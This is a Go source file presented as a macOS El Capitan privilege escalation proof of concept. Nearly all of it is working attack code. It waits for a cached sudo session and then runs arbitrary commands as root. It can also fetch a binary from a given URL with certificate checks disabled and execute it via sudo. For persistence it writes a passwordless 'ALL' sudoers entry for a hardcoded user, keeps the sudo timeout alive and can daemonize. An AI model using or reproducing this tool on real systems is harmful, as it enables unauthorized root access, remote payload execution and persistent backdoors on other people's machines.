// OSX ElCapitan Privilege Escalation Proof Of Concept
// Copyright (c) 2017 Philipp Mieden <dreadl0ck@protonmail.ch>

// THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
// WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
// MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
// ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
// WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
// ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
// OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

package main

import (
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"strconv"
	"time"

	"github.com/VividCortex/godaemon"
)

const (
	// sudo access check interval
	loopInterval = 5

	// interval for extending session
	extendInterval = 120

	// user name for persistent access
	user = "bob"
	pass = "test"
)

var (
	// toggle debug mode
	debug = true

	// daemonize
	daemon = false

	// flags
	binPtr = flag.String("b", "", "path to binary to execute")
	urlPtr = flag.String("u", "", "url for downloading bin")
	cmdPtr = flag.String("c", "", "command to execute")
	pPtr   = flag.String("p", "", "make root access persistent <full/session>")
)

func main() {

	flag.Usage = func() {
		fmt.Println("Usage: osx-root-installer [-p full|session] [-b bin] [-u url] [-c command]")
		flag.PrintDefaults()
	}
	flag.Parse()

	// set working dir
	wd, err := os.Getwd()
	checkError(err)

	// handle flags
	if *binPtr != "" {
		// check if bin exists
		if _, err := os.Stat(wd + "/" + *binPtr); err == nil {
			daemonize()
			// make executable
			os.Chmod(wd+"/"+*binPtr, 0777)
			runBinary(wd + "/" + *binPtr)
		} else {
			fmt.Println("File", wd+"/"+*binPtr, "does not exist!")
			os.Exit(1)
		}
	} else if *urlPtr != "" {
		// test connection
		ok := checkNetConn()
		if ok {
			daemonize()
			downloadFromURL(wd, *urlPtr)
		} else {
			// no internet
			fmt.Println("NO INTERNET!")
			os.Exit(1)
		}
	} else if *cmdPtr != "" {
		daemonize()
		execRootCommand(*cmdPtr)
	} else if *pPtr != "" {
		if *pPtr == "full" {
			daemonize()
			changeSudoers()
		} else if *pPtr == "session" {
			daemonize()
			extendSudoTimeout()
		} else {
			fmt.Println("Error: paramter for -p must be <full/session>")
		}
	} else {
		fmt.Println("no parameters supplied!")
		flag.Usage()
		return
	}

	return
}

// check sudo loop
func loop() bool {

	fmt.Println("checking for sudo access...")

	// loop testSudo until success
	for {
		ok := testSudo()
		if ok {
			fmt.Println("SUCCESS!")
			break
		}
		time.Sleep(loopInterval * time.Second)
	}
	return true
}

// try to use sudo command
func testSudo() bool {

	var (
		echo = exec.Command("echo", "pass")
		sudo = exec.Command("sudo", "-Sv")
	)

	echoOut, err := echo.StdoutPipe()
	checkError(err)

	echo.Start()
	sudo.Stdin = echoOut

	_, err = sudo.CombinedOutput()
	if err != nil {
		Debug("sudo is not active:", err)
		return false
	}

	fmt.Println("sudo is ACTIVE!")
	return true

}

// execute command using sudo
func execRootCommand(command string) {
	ok := loop()
	if ok {
		err := exec.Command("bash", "-c", command).Run()
		checkError(err)
	}
}

// download binary from URL
func downloadFromURL(wd, link string) {
	ok := loop()
	if ok {
		fileName, err := downloadFile(wd, link)
		checkError(err)

		Debug("executing", fileName, "...")
		err = exec.Command("sudo", fileName).Run()
		checkError(err)
	}
}

// download a file from remote
func downloadFile(wd, link string) (string, error) {

	Debug("Downloading file...")

	fileURL, err := url.Parse(link)
	checkError(err)

	fileName := path.Base(fileURL.Path)
	fileName = wd + "/" + fileName

	Debug("fileName:", fileName)

	var file *os.File

	// check if File already exists
	if _, err := os.Stat(fileName); err == nil {
		// overwrite file
		file, err = os.OpenFile(fileName, os.O_RDWR|os.O_TRUNC, 0666)
		checkError(err)
		defer file.Close()
	} else {
		// create File
		file, err = os.Create(fileName)
		checkError(err)
	}
	defer file.Close()

	// create Client without cert check
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	// create authenticated Request
	req, err := http.NewRequest("GET", link, nil)
	req.SetBasicAuth("john", "asdf1234qweryxcv")
	resp, err := client.Do(req)
	checkError(err)
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		size, err := io.Copy(file, resp.Body)
		checkError(err)

		fmt.Printf("%s with %v bytes downloaded\n", fileName, size)

		// make executable
		os.Chmod(fileName, 0777)
	} else {
		return "", errors.New("ERROR: got a " + strconv.Itoa(resp.StatusCode) + " response code.")
	}

	return fileName, nil
}

// run binary
func runBinary(bin string) {
	Debug("runBinary:", bin)
	ok := loop()
	if ok {
		err := exec.Command("sudo", bin).Run()
		checkError(err)
	}
}

// =============== //
// persistent mode //
// =============== //

// add magic line to sudoers
func changeSudoers() {

	var magicLine = user + "		ALL=(ALL) NOPASSWD: ALL"

	ok := loop()
	if ok {

		script := `
		#!/bin/bash

		# create lock file
		sudo touch /etc/sudoers.tmp

		# copy sudoers file
		sudo cat /etc/sudoers > $HOME/sudoers.new

		# add magic line
		sudo echo '` + magicLine + `' >> $HOME/sudoers.new

		# validate
		sudo visudo -c -f $HOME/sudoers.new
		if (( $? == 0 )); then
			sudo chown root $HOME/sudoers.new
			sudo chmod 0600 $HOME/sudoers.new
			sudo mv $HOME/sudoers.new /etc/sudoers
		fi

		# cleanup
		sudo rm /etc/sudoers.tmp

		exit
		`

		// execute script
		err := exec.Command("bash", "-c", script).Run()
		checkError(err)

		Debug("changed sudoers!")
	}
}

// add a new user to OSX
func addUser() {
	script := `
	#!/bin/bash

	user="` + user + `"
	pass="` + pass + `"

	dscl . -create /Users/$user
	dscl . -create /Users/$user UserShell /bin/bash
	dscl . -create /Users/$user RealName “user“
	dscl . -create /Users/$user UniqueID 505

	# PrimaryGroupID of 80 creates an admin user
	# PrimaryGroupID of 20 to create a standard user
	dscl . -create /Users/$user PrimaryGroupID 20

	dscl . -create /Users/$user NFSHomeDirectory /Users/$user
	dscl . -passwd /Users/$user $pass

	# dscl . append /Groups/admin GroupMembership $user

	# create home directory
	createhomedir -u $user
	`

	// execute script
	err := exec.Command("bash", "-c", script).Run()
	checkError(err)

	Debug("added user:", user)
}

// extend the sudo timeout until the computer is being put to sleep (session option)
func extendSudoTimeout() {
	for {

		var (
			echo = exec.Command("echo", "pass")
			sudo = exec.Command("sudo", "-Sv")
		)

		echoOut, err := echo.StdoutPipe()
		checkError(err)

		echo.Start()
		sudo.Stdin = echoOut

		_ = sudo.Run()

		time.Sleep(extendInterval * time.Second)
	}
}

// ===== //
// utils //
// ===== //

// daemonize
func daemonize() {
	if daemon {
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})
	}
}

// Debug prints the message if debug mode is active
func Debug(msg ...interface{}) {
	if debug {
		fmt.Println("[DEBUG]", msg)
	}
}

// test if theres an internet connection
func checkNetConn() bool {

	// recover from panic when theres no connection
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("HTTP Request failed:", err)
		}
	}()

	// ping google
	_, err := http.Head("http://www.google.de")
	if err != nil {
		//fmt.Println(err)
		return false
	}

	// if theres no internet, theres a panic
	return true
}

func checkError(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
